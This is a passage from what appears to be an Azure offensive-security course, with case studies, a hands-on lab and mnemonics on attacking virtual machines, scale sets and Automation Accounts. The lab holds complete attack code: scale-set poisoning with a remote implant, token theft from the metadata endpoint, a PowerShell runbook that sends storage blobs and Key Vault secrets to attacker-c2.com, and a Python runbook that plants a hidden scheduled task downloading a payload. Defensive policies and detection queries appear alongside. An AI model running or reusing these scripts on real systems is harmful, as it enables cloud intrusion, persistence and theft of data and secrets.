Users**: Multiple users had `Microsoft.Compute/virtualMachines/extensions/write`\n2. **No Extension Monitoring**: Organization didn't monitor VM extension deployments\n3. **Missing SCPs**: No Azure Policy preventing unauthorized extension types\n4. **Delayed Billing Alerts**: Cost alerts set at monthly threshold, not daily\n5. **No Managed Identity**: VMs used VM Extensions for configuration instead of managed identities\n\n**Detection Opportunities Missed**:\n- Azure Activity Log showed 47 simultaneous extension deployments (highly anomalous)\n- Extensions contacted external URL (not Azure endpoint)\n- CPU utilization spiked to 100% across all affected VMs\n- Network egress increased dramatically (connecting to mining pool)\n\n**Defensive Recommendations**:\n\n```json\n// Azure Policy: Deny unauthorized VM extension types\n{\n  \"mode\": \"All\",\n  \"policyRule\": {\n    \"if\": {\n      \"allOf\": [\n        {\n          \"field\": \"type\",\n          \"equals\": \"Microsoft.Compute/virtualMachines/extensions\"\n        },\n        {\n          \"field\": \"Microsoft.Compute/virtualMachines/extensions/publisher\",\n          \"notIn\": [\n            \"Microsoft.Azure.Security\",\n            \"Microsoft.Azure.Diagnostics\",\n            \"Microsoft.EnterpriseCloud.Monitoring\"\n          ]\n        }\n      ]\n    },\n    \"then\": {\n      \"effect\": \"deny\"\n    }\n  }\n}\n```\n\n**Azure Sentinel Detection Rule**:\n\n```kql\n// Alert on suspicious VM extension deployments\nAzureActivity\n| where OperationNameValue == \"Microsoft.Compute/virtualMachines/extensions/write\"\n| where ActivityStatusValue == \"Success\"\n| extend ExtensionPublisher = tostring(parse_json(Properties).publisher)\n| extend ExtensionType = tostring(parse_json(Properties).type)\n| extend CommandToExecute = tostring(parse_json(Properties).settings.commandToExecute)\n| where ExtensionPublisher !in (\"Microsoft.Azure.Security\", \"Microsoft.Azure.Diagnostics\")\n     or CommandToExecute contains \"http://\" \n     or CommandToExecute contains \"https://\"\n| summarize \n    ExtensionCount = count(),\n    AffectedVMs = make_set(Resource),\n    DistinctExtensions = make_set(ExtensionType),\n    Commands = make_set(CommandToExecute)\n    by Caller, CallerIpAddress, bin(TimeGenerated, 5m)\n| where ExtensionCount > 5  // Multiple VMs in short time = suspicious\n| project TimeGenerated, Caller, CallerIpAddress, ExtensionCount, AffectedVMs, DistinctExtensions, Commands\n```\n\n---\n\n### Case Study 2: Red Team Operation - VMSS Persistence and Lateral Movement\n\n**Scenario**: Authorized red team engagement for Fortune 500 financial services company\n\n**Objective**: Demonstrate Azure compute security weaknesses\n\n**Attack Chain**:\n\n**Phase 1: Initial Compromise**\n- Phishing email compromises employee workstation\n- Harvest Azure CLI credentials from `.azure/` directory\n- Credentials belong to DevOps engineer with VM Contributor role\n\n**Phase 2: Reconnaissance**\n```bash\n# Discover VM Scale Sets\naz vmss list --query \"[].{Name:name, ResourceGroup:resourceGroup, Capacity:sku.capacity}\" -o table\n\n# Output:\n# Name                    ResourceGroup       Capacity\n# vmss-api-prod          rg-production       10\n# vmss-web-prod          rg-production       25\n# vmss-processing-prod   rg-production       50\n\n# 85 VMs total in scale sets!\n```\n\n**Phase 3: VMSS Model Poisoning**\n```bash\n# Get current VMSS model\naz vmss show --name \"vmss-api-prod\" --resource-group \"rg-production\" > vmss-model.json\n\n# Modify model to add malicious extension\ncat > malicious-extension.json <<EOF\n{\n  \"name\": \"CustomScriptExtension\",\n  \"properties\": {\n    \"publisher\": \"Microsoft.Azure.Extensions\",\n    \"type\": \"CustomScript\",\n    \"typeHandlerVersion\": \"2.1\",\n    \"autoUpgradeMinorVersion\": true,\n    \"settings\": {\n      \"fileUris\": [\"https://red-team-c2.internal/implant.sh\"],\n      \"commandToExecute\": \"bash implant.sh\"\n    }\n  }\n}\nEOF\n\n# Update VMSS model with malicious extension\naz vmss extension set \\\n  --resource-group \"rg-production\" \\\n  --vmss-name \"vmss-api-prod\" \\\n  --name \"CustomScriptExtension\" \\\n  --publisher \"Microsoft.Azure.Extensions\" \\\n  --version \"2.1\" \\\n  --settings '{\"fileUris\": [\"https://red-team-c2.internal/implant.sh\"], \"commandToExecute\": \"bash implant.sh\"}'\n\n# Trigger upgrade to deploy malicious extension to all instances\naz vmss update-instances \\\n  --resource-group \"rg-production\" \\\n  --name \"vmss-api-prod\" \\\n  --instance-ids \"*\"\n```\n\n**Phase 4: Persistence and C2**\n- Malicious extension deploys reverse shell to C2 server\n- All 10 instances in `vmss-api-prod` now compromised\n- When autoscaling creates new instances, they automatically receive malicious extension\n- Achieved persistent access to dynamically scaling infrastructure\n\n**Phase 5: Managed Identity Exploitation**\n```bash\n# From compromised VMSS instance, steal managed identity token\ncurl -H \"Metadata:true\" \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/\" | jq -r '.access_token'\n\n# Use token to access Azure Storage (API backend stores data here)\naz storage blob list \\\n  --account-name \"prodapistorage\" \\\n  --container-name \"customer-data\" \\\n  --auth-mode login \\\n  --auth-token \"<stolen_token>\"\n\n# Exfiltrate sensitive customer data\n```\n\n**Impact Demonstration**:\n- **Compromised**: 10 VMs initially, expanded to 25 VMs as autoscaling triggered\n- **Persistence**: Malicious extension remained across VM reimaging and updates\n- **Data Access**: Managed identity had `Storage Blob Data Contributor` on production storage\n- **Lateral Movement**: From VMSS, pivoted to Azure SQL Database and Key Vault\n- **Timeline**: Initial access to full data exfiltration in 4 hours\n\n**Key Findings Reported**:\n1. **RBAC Over-Permissioning**: DevOps engineers had VM Contributor instead of read-only\n2. **No VMSS Model Validation**: No approval process for VMSS model changes\n3. **Overly Permissive Managed Identities**: VMSS managed identity had excessive data plane permissions\n4. **Lack of Monitoring**: No alerts on VMSS model modifications or extension deployments\n5. **No Network Segmentation**: VMSS instances could reach internet and all Azure services\n\n**Remediation Implemented**:\n\n```hcl\n# Terraform: Implement Azure Policy to require approval for VMSS changes\nresource \"azurerm_policy_definition\" \"vmss_change_approval\" {\n  name         = \"require-vmss-change-approval\"\n  policy_type  = \"Custom\"\n  mode         = \"All\"\n  display_name = \"Require Approval for VMSS Model Changes\"\n\n  policy_rule = jsonencode({\n    if = {\n      allOf = [\n        {\n          field  = \"type\"\n          equals = \"Microsoft.Compute/virtualMachineScaleSets\"\n        },\n        {\n          field  = \"Microsoft.Compute/virtualMachineScaleSets/virtualMachineProfile.extensionProfile\"\n          exists = \"true\"\n        }\n      ]\n    }\n    then = {\n      effect = \"audit\"  # Log for review, or use \"deny\" for strict control\n    }\n  })\n}\n\n# Azure Sentinel alert for VMSS model changes\nresource \"azurerm_sentinel_alert_rule_scheduled\" \"vmss_model_change\" {\n  name                       = \"VMSS Model Modification Detected\"\n  log_analytics_workspace_id = azurerm_log_analytics_workspace.main.id\n  display_name               = \"Alert on VM Scale Set Model Changes\"\n  severity                   = \"High\"\n  query                      = <<-QUERY\n    AzureActivity\n    | where OperationNameValue == \"Microsoft.Compute/virtualMachineScaleSets/write\"\n    | where ActivityStatusValue == \"Success\"\n    | extend ModelChanges = parse_json(Properties)\n    | project TimeGenerated, Caller, CallerIpAddress, Resource, ModelChanges\n  QUERY\n\n  frequency              = \"PT5M\"  # Check every 5 minutes\n  query_period           = \"PT5M\"\n  trigger_operator       = \"GreaterThan\"\n  trigger_threshold      = 0  # Alert on any VMSS model change\n}\n```\n\n---\n\n### Lessons Learned: Compute Security Best Practices\n\n1. **Principle of Least Privilege**:\n   - Don't grant `Microsoft.Compute/*/write` unnecessarily\n   - Use custom RBAC roles with specific permissions\n   - Managed identities should have minimal data plane access\n\n2. **Monitoring and Detection**:\n   - Alert on all VM extension deployments\n   - Monitor VMSS model changes\n   - Track managed identity token requests and usage\n   - Set up billing alerts for unexpected compute costs\n\n3. **Defense in Depth**:\n   - Azure Policy to restrict allowed extension types\n   - Network segmentation to limit VM internet access\n   - Host-based firewalls to block IMDS from untrusted processes\n   - Regular RBAC audits and access reviews\n\n4. **Incident Response**:\n   - Have playbooks for VM compromise scenarios\n   - Practice extension removal and VM reimaging\n   - Test managed identity rotation procedures\n   - Maintain offline backups of VMSS models\n\nThese real-world cases demonstrate that Azure compute resources are high-value targets. Master these attack techniques, and you'll be able to both exploit and defend Azure environments effectively. ğŸ›¡ï¸"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Hands-On Lab 2: Exploiting Azure Automation Accounts\n\nAzure Automation Accounts are incredibly powerfulâ€”and dangerous when compromised. They can execute arbitrary PowerShell and Python code, access stored credentials, and interact with both Azure and on-premises infrastructure via Hybrid Runbook Workers.\n\n### Scenario\n\nYou're conducting a penetration test and have compromised Azure credentials with the following permissions:\n- `Microsoft.Automation/automationAccounts/read`\n- `Microsoft.Automation/automationAccounts/runbooks/write`\n- `Microsoft.Automation/automationAccounts/jobs/write`\n\nYour goal: Create a malicious runbook to exfiltrate data and establish persistence.\n\n### Attack Step 1: Reconnaissance - Discover Automation Accounts\n\n```bash\n# List all Automation Accounts in subscription\naz automation account list --query \"[].{Name:name, ResourceGroup:resourceGroup, Location:location}\" -o table\n\n# Get detailed information about a specific Automation Account\naz automation account show \\\n  --name \"automation-prod\" \\\n  --resource-group \"rg-automation\"\n\n# List existing runbooks\naz automation runbook list \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --query \"[].{Name:name, State:state, RunbookType:runbookType}\" -o table\n\n# List stored credentials (password values not returned, but shows what's available)\naz automation credential list \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\"\n\n# List variables (may contain sensitive data)\naz automation variable list \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\"\n\n# Check for Hybrid Runbook Workers (on-premises access!)\naz automation hrwg list \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\"\n```\n\n**Key Information to Gather**:\n- Automation Account name and resource group\n- Managed identity assigned (system or user-assigned)\n- Existing runbooks (understand legitimate operations)\n- Stored credentials and variables\n- Hybrid Runbook Worker groups (on-premises targets)\n\n### Attack Step 2: Create Malicious Runbook for Data Exfiltration\n\n**PowerShell Runbook - Azure Storage Exfiltration:**\n\n```powershell\n<#\n.SYNOPSIS\n    Data Exfiltration via Azure Automation Managed Identity\n    \n.DESCRIPTION\n    This malicious runbook uses the Automation Account's managed identity\n    to access Azure Storage and exfiltrate data to attacker-controlled location.\n    \n.NOTES\n    Author: Red Team\n    Execution: Runs with Automation Account managed identity permissions\n#>\n\nparam(\n    [Parameter(Mandatory=$false)]\n    [string]$TargetStorageAccount = \"prodstorage001\",\n    \n    [Parameter(Mandatory=$false)]\n    [string]$TargetContainer = \"sensitive-data\",\n    \n    [Parameter(Mandatory=$false)]\n    [string]$ExfilURL = \"https://attacker-c2.com/upload\"\n)\n\ntry {\n    # Step 1: Authenticate using Automation Account Managed Identity\n    Write-Output \"[+] Authenticating with Managed Identity...\"\n    Connect-AzAccount -Identity\n    \n    # Step 2: Get Storage Account context\n    Write-Output \"[+] Accessing Storage Account: $TargetStorageAccount\"\n    $storageAccount = Get-AzStorageAccount | Where-Object {$_.StorageAccountName -eq $TargetStorageAccount}\n    \n    if (-not $storageAccount) {\n        Write-Error \"[-] Storage account not found or no access\"\n        exit 1\n    }\n    \n    $ctx = $storageAccount.Context\n    \n    # Step 3: List all blobs in target container\n    Write-Output \"[+] Enumerating blobs in container: $TargetContainer\"\n    $blobs = Get-AzStorageBlob -Container $TargetContainer -Context $ctx\n    \n    Write-Output \"[+] Found $($blobs.Count) blobs\"\n    \n    # Step 4: Download and exfiltrate each blob\n    foreach ($blob in $blobs) {\n        Write-Output \"[+] Processing: $($blob.Name)\"\n        \n        # Download blob to memory\n        $tempFile = [System.IO.Path]::GetTempFileName()\n        Get-AzStorageBlobContent -Blob $blob.Name -Container $TargetContainer -Context $ctx -Destination $tempFile -Force\n        \n        # Read file content\n        $content = Get-Content -Path $tempFile -Raw\n        \n        # Exfiltrate to C2\n        $body = @{\n            filename = $blob.Name\n            content = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))\n            timestamp = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n            source = $env:COMPUTERNAME\n        } | ConvertTo-Json\n        \n        Invoke-RestMethod -Uri $ExfilURL -Method Post -Body $body -ContentType \"application/json\"\n        \n        # Clean up\n        Remove-Item -Path $tempFile -Force\n        \n        Write-Output \"[+] Exfiltrated: $($blob.Name) ($([math]::Round($blob.Length/1KB, 2)) KB)\"\n    }\n    \n    # Step 5: Enumerate and exfiltrate Key Vault secrets\n    Write-Output \"[+] Enumerating Key Vaults...\"\n    $keyVaults = Get-AzKeyVault\n    \n    foreach ($kv in $keyVaults) {\n        Write-Output \"[+] Accessing Key Vault: $($kv.VaultName)\"\n        \n        try {\n            $secrets = Get-AzKeyVaultSecret -VaultName $kv.VaultName\n            \n            foreach ($secret in $secrets) {\n                $secretValue = Get-AzKeyVaultSecret -VaultName $kv.VaultName -Name $secret.Name -AsPlainText\n                \n                $body = @{\n                    type = \"keyvault-secret\"\n                    vault = $kv.VaultName\n                    secret_name = $secret.Name\n                    secret_value = $secretValue\n                    timestamp = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n                } | ConvertTo-Json\n                \n                Invoke-RestMethod -Uri $ExfilURL -Method Post -Body $body -ContentType \"application/json\"\n                \n                Write-Output \"[+] Exfiltrated secret: $($secret.Name) from $($kv.VaultName)\"\n            }\n        } catch {\n            Write-Output \"[-] No access to Key Vault: $($kv.VaultName)\"\n        }\n    }\n    \n    Write-Output \"[+] Exfiltration complete!\"\n    \n} catch {\n    Write-Error \"[-] Runbook failed: $_\"\n    exit 1\n}\n```\n\n### Attack Step 3: Deploy Malicious Runbook\n\n```bash\n# Create the runbook\naz automation runbook create \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --name \"Invoke-DataExfiltration\" \\\n  --type \"PowerShell\" \\\n  --description \"Routine data backup process\" \\\n  --location \"eastus\"\n\n# Upload runbook content (save PowerShell script to local file first)\naz automation runbook replace-content \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --name \"Invoke-DataExfiltration\" \\\n  --content @malicious-runbook.ps1\n\n# Publish the runbook\naz automation runbook publish \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --name \"Invoke-DataExfiltration\"\n\n# Start the runbook\naz automation runbook start \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --name \"Invoke-DataExfiltration\"\n\n# Monitor job execution\naz automation job list \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --query \"[?runbook.name=='Invoke-DataExfiltration'].{JobId:jobId, Status:status, StartTime:startTime}\" -o table\n\n# Get job output\naz automation job show-output \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --job-name \"<job-id>\"\n```\n\n### Attack Step 4: Establish Persistence via Scheduled Runbook\n\n```bash\n# Create schedule to run runbook daily\naz automation schedule create \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --name \"DailyExfiltration\" \\\n  --frequency \"Day\" \\\n  --interval 1 \\\n  --start-time \"2025-01-15T03:00:00+00:00\" \\\n  --description \"Daily backup schedule\"\n\n# Link runbook to schedule\naz automation job-schedule create \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --runbook-name \"Invoke-DataExfiltration\" \\\n  --schedule-name \"DailyExfiltration\"\n```\n\n### Attack Step 5: Python Runbook for Hybrid Worker (On-Premises Access)\n\n**Python Runbook - Deploy to On-Premises Hybrid Worker:**\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nHybrid Runbook Worker Exploitation\nExecutes on on-premises infrastructure via Azure Automation Hybrid Worker\n\"\"\"\n\nimport subprocess\nimport socket\nimport json\nimport requests\nfrom datetime import datetime\n\ndef get_hostname():\n    \"\"\"Get hostname of Hybrid Worker\"\"\"\n    return socket.gethostname()\n\ndef execute_command(command):\n    \"\"\"Execute system command and return output\"\"\"\n    try:\n        result = subprocess.run(\n            command,\n            shell=True,\n            capture_output=True,\n            text=True,\n            timeout=30\n        )\n        return {\n            \"stdout\": result.stdout,\n            \"stderr\": result.stderr,\n            \"returncode\": result.returncode\n        }\n    except Exception as e:\n        return {\"error\": str(e)}\n\ndef enumerate_environment():\n    \"\"\"Gather information about on-premises environment\"\"\"\n    info = {\n        \"hostname\": get_hostname(),\n        \"timestamp\": datetime.now().isoformat(),\n        \"reconnaissance\": {}\n    }\n    \n    # Run reconnaissance commands\n    recon_commands = {\n        \"hostname\": \"hostname\",\n        \"ipconfig\": \"ipconfig /all\",  # Windows\n        \"network\": \"ip a\",  # Linux\n        \"users\": \"net user\",  # Windows\n        \"processes\": \"tasklist\",  # Windows\n        \"domain\": \"echo %USERDOMAIN%\",  # Windows\n        \"whoami\": \"whoami /all\"\n    }\n    \n    for name, cmd in recon_commands.items():\n        print(f\"[+] Running: {name}\")\n        result = execute_command(cmd)\n        info[\"reconnaissance\"][name] = result\n    \n    return info\n\ndef exfiltrate_data(data, c2_url):\n    \"\"\"Send data to C2 server\"\"\"\n    try:\n        response = requests.post(\n            c2_url,\n            json=data,\n            headers={\"Content-Type\": \"application/json\"},\n            timeout=10\n        )\n        print(f\"[+] Exfiltration status: {response.status_code}\")\n        return True\n    except Exception as e:\n        print(f\"[-] Exfiltration failed: {e}\")\n        return False\n\ndef establish_persistence():\n    \"\"\"Create scheduled task for persistence (Windows)\"\"\"\n    # Create malicious scheduled task\n    task_command = '''\nschtask /create /tn \"SystemUpdate\" /tr \"powershell.exe -NoP -W Hidden -Exec Bypass -C 'IEX (New-Object Net.WebClient).DownloadString('\"'\"'https://attacker-c2.com/implant.ps1'\"'\"')'\" /sc daily /st 02:00 /f\n    '''\n    \n    result = execute_command(task_command)\n    print(f\"[+] Persistence: {result}\")\n    return result\n\ndef main():\n    \"\"\"Main exploitation routine\"\"\"\n    print(\"[+] Hybrid Runbook Worker Exploitation Started\")\n    print(f\"[+] Running on: {get_hostname()}\")\n    \n    # C2 server URL\n    C2_URL = \"https://attacker-c2.com/hybrid-worker\"\n    \n    # Step 1: Enumerate environment\n    print(\"[+] Enumerating on-premises environment...\")\n    recon_data = enumerate_environment()\n    \n    # Step 2: Exfiltrate reconnaissance data\n    print(\"[+] Exfiltrating data...\")\n    exfiltrate_data(recon_data, C2_URL)\n    \n    # Step 3: Establish persistence\n    print(\"[+] Establishing persistence...\")\n    establish_persistence()\n    \n    # Step 4: Additional post-exploitation\n    # - Lateral movement to other on-premises systems\n    # - Credential harvesting\n    # - File system enumeration\n    # - Network scanning\n    \n    print(\"[+] Hybrid Worker exploitation complete!\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n**Deploy Python Runbook to Hybrid Worker:**\n\n```bash\n# Create Python runbook\naz automation runbook create \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --name \"HybridWorkerRecon\" \\\n  --type \"Python3\" \\\n  --description \"System health check\"\n\n# Upload Python script\naz automation runbook replace-content \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --name \"HybridWorkerRecon\" \\\n  --content @hybrid-exploit.py\n\n# Publish runbook\naz automation runbook publish \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --name \"HybridWorkerRecon\"\n\n# Start runbook on specific Hybrid Worker group\naz automation runbook start \\\n  --automation-account-name \"automation-prod\" \\\n  --resource-group \"rg-automation\" \\\n  --name \"HybridWorkerRecon\" \\\n  --parameters '{\"RunOn\":\"OnPremisesWorkerGroup\"}'\n```\n\n### Defense and Detection\n\n**Defensive Controls:**\n\n1. **RBAC Restrictions**:\n```bash\n# Custom role with read-only Automation Account access\naz role definition create --role-definition '{\n  \"Name\": \"Automation Account Reader\",\n  \"Description\": \"Read-only access to Automation Accounts\",\n  \"Actions\": [\n    \"Microsoft.Automation/automationAccounts/read\",\n    \"Microsoft.Automation/automationAccounts/runbooks/read\",\n    \"Microsoft.Automation/automationAccounts/jobs/read\"\n  ],\n  \"NotActions\": [],\n  \"AssignableScopes\": [\"/subscriptions/{subscription-id}\"]\n}'\n```\n\n2. **Azure Policy - Require Approval for Runbook Changes**:\n```json\n{\n  \"mode\": \"All\",\n  \"policyRule\": {\n    \"if\": {\n      \"allOf\": [\n        {\n          \"field\": \"type\",\n          \"equals\": \"Microsoft.Automation/automationAccounts/runbooks\"\n        }\n      ]\n    },\n    \"then\": {\n      \"effect\": \"audit\"\n    }\n  }\n}\n```\n\n3. **Monitoring with Azure Sentinel**:\n```kql\n// Detect suspicious runbook activity\nAzureDiagnostics\n| where ResourceProvider == \"MICROSOFT.AUTOMATION\"\n| where Category == \"JobLogs\" or Category == \"JobStreams\"\n| where ResultDescription contains \"Invoke-RestMethod\" \n     or ResultDescription contains \"Invoke-WebRequest\"\n     or ResultDescription contains \"http://\" \n     or ResultDescription contains \"https://\"\n| summarize \n    JobCount = count(),\n    DistinctRunbooks = make_set(RunbookName_s),\n    OutputSample = take_any(ResultDescription)\n    by RunbookName_s, bin(TimeGenerated, 5m)\n| where JobCount > 1\n| project TimeGenerated, RunbookName_s, JobCount, DistinctRunbooks, OutputSample\n```\n\n### Your Turn: Practice Lab\n\n**Objective**: Create and test Automation Account security controls.\n\n**Steps**:\n1. Create Azure Automation Account with managed identity\n2. Create legitimate runbook (e.g., VM backup automation)\n3. Implement RBAC controls to restrict runbook modification\n4. Create Azure Policy to audit runbook changes\n5. Set up Azure Sentinel alert for suspicious runbook execution\n6. Test by attempting unauthorized runbook modification\n7. Verify that alerts fire and policy blocks/audits the attempt\n\n**Success Criteria**:\n- Automation Account properly configured with least-privilege managed identity\n- Azure Policy audits all runbook modifications\n- Sentinel alert fires on suspicious runbook activity (external URLs, exfiltration patterns)\n- Unauthorized runbook modifications are detected and blocked\n\nAzure Automation Accounts are extremely powerfulâ€”master them, and you control the automation backbone of Azure environments! ğŸ¤–"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "## Memory Hooks: Azure Compute Exploitation Mnemonics\n\n### The \"V.I.M.\" Framework for Azure Compute Attacks\n\nThink of **VIM** (like the text editor) to remember the three core Azure compute attack surfaces:\n\n**V = Virtual Machines**\n- **V**ery valuable targets with managed identities\n- **V**ulnerable via VM Extensions (code execution as SYSTEM/root)\n- Remember: \"VMs are the **V**ault keys to Azure resources\"\n\n**I = IMDS (Instance Metadata Service)**\n- **I**nstant access to managed identity tokens at 169.254.169.254\n- **I**nsecure by default (no authentication required)\n- Remember: \"**I**MDS = **I** **M**ade **D**ata **S**tealable\"\n\n**M = Managed Identities**\n- **M**agic tokens for accessing Azure services\n- **M**ost critical post-compromise target\n- Remember: \"**M**anaged Identities = **M**aster keys to Azure\"\n\n---\n\n### The \"ESCAPE\" Method for Privilege Escalation\n\nUse **ESCAPE** to remember Azure compute privilege escalation paths:\n\n**E = Extensions** (VM Extensions for code execution)\n- Think: \"**E**xtensions **E**xecute **E**verything\"\n- Custom Script Extensions run as SYSTEM/root\n\n**S = Scale Sets** (VMSS model poisoning)\n- Think: \"**S**cale **S**ets **S**pread malware\"\n- Modify one model, compromise all instances\n\n**C = Credentials** (Automation Account stored credentials)\n- Think: \"**C**redentials in **C**loud = **C**ompromised\"\n- Automation Variables and Credentials store secrets\n\n**A = Automation** (Automation Account runbooks)\n- Think: \"**A**utomation **A**ccounts **A**mplify attacks\"\n- PowerShell/Python runbooks with managed identity permissions\n\n**P = Permissions** (RBAC over-provisioning)\n- Think: \"**P**ermissions = **P**ath to **P**rivilege\"\n- `Microsoft.Compute/*/write` = full control\n\n**E = Endpoints** (IMDS endpoint at 169.254.169.254)\n- Think: \"**E**ndpoint **E**xposes **E**verything\"\n- Query IMDS for managed identity tokens\n\n---\n\n### The \"Triple-A\" Azure Compute Attack Pattern\n\nRemember **AAA** (like AAA batteries) for the standard attack sequence:\n\n**A = Access** (Compromise initial VM or credentials)\n- Phishing, RCE, stolen credentials\n- Goal: Get foothold in Azure environment\n\n**A = Amplify** (Use IMDS and managed identities to escalate)\n- Query IMDS for managed identity token\n- Use token to access Storage, Key Vault, databases\n- Deploy VM Extensions for code execution\n\n**A = Automate** (Use Automation Accounts for persistence and lateral movement)\n- Create malicious runbooks\n- Deploy to Hybrid Workers for on-premises access\n- Establish scheduled execution for persistence\n\nVisual: Think of **AAA batteries** powering an attackâ€”Access â†’ Amplify â†’ Automate\n\n---\n\n### VMSS Attack Acronym: \"MODEL\"\n\n**M = Modify** the VMSS model\n- Add malicious VM Extension to template\n\n**O = Observe** current instances\n- Check which instances are running\n\n**D = Deploy** changes\n- Trigger upgrade to push malicious model\n\n**E = Execute** on all instances\n- Extension runs automatically on every VM\n\n**L = Lateral** movement\n- From VMSS, pivot to other Azure resources\n\nRemember: \"VMSS attacks follow the **MODEL** pattern\"\n\n---\n### IMDS Exploitation: \"169\" Rule\n\n**169.254.169.254** is hard to remember, so use this trick:\n\n**\"169\"** â†’ Think **\"One-Six-CLOUD\"**\n- **One** = Single endpoint for all metadata\n- **Six** = 6 letters in \"IMDS\" if you count \"I-M-D-S\" + \"EE\" (Endpoint Exploitation)\n- **CLOUD** = Cloud metadata service\n\nOr remember: **\"169 = Link-Local\"**\n- 169.254.0.0/16 is the link-local address range\n- IMDS uses .254 (last usable address) for both octets\n- Pattern: 169.**254**.169.**254** (mirror image!)\n\n---\n\n### Automation Account Components: \"HARVEST\"\n\n**H = Hybrid** Runbook Workers (on-premises access)\n**A = Accounts** (stored credentials)\n**R = Runbooks** (PowerShell/Python code)\n**V = Variables** (configuration and secrets)\n**E = Executions** (job history and output)\n**S = Schedules** (persistence via timed execution)\n**T = Tokens** (managed identity access tokens)\n\nThink: \"**HARVEST** the Automation Account for all its secrets\"\n\n---\n\n### Azure Compute Defense: \"BLOCK\"\n\n**B = Block** IMDS access with host firewall\n- iptables or Windows Firewall to 169.254.169.254\n\n**L = Least** privilege for managed identities\n- Minimal RBAC and data plane permissions\n\n**O = Observe** with Azure Sentinel\n- Monitor VM Extension deployments, runbook executions\n\n**C = Control** with Azure Policy\n- Deny unauthorized extension types\n\n**K = Kill** suspicious processes immediately\n- Incident response for compromised VMs\n\nRemember: \"**BLOCK** Azure compute attacks with defense in depth\"\n\n---\n\n### Quick Reference Card\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚         Azure Compute Exploitation Cheat Sheet            â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ VIM Framework:                                             â”‚\nâ”‚   V = Virtual Machines (Extensions, managed identities)    â”‚\nâ”‚   I = IMDS (169.254.169.254 = instant token theft)        â”‚\nâ”‚   M = Managed Identities (keys to Azure resources)        â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ ESCAPE Privilege Escalation:                              â”‚\nâ”‚   E = Extensions (SYSTEM/root code execution)             â”‚\nâ”‚   S = Scale Sets (model poisoning)                        â”‚\nâ”‚   C = Credentials (Automation Account secrets)            â”‚\nâ”‚   A = Automation (runbook injection)                      â”‚\nâ”‚   P = Permissions (RBAC exploitation)                     â”‚\nâ”‚   E = Endpoints (IMDS abuse)                              â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ Triple-A Attack Pattern:                                   â”‚\nâ”‚   A = Access (initial compromise)                         â”‚\nâ”‚   A = Amplify (IMDS + managed identity escalation)       â”‚\nâ”‚   A = Automate (Automation Account persistence)           â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ BLOCK Defense:                                            â”‚\nâ”‚   B = Block IMDS    L = Least privilege                  â”‚\nâ”‚   O = Observe logs  C = Control with Policy              â”‚\nâ”‚   K = Kill threats                                        â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\nUse these memory hooks during 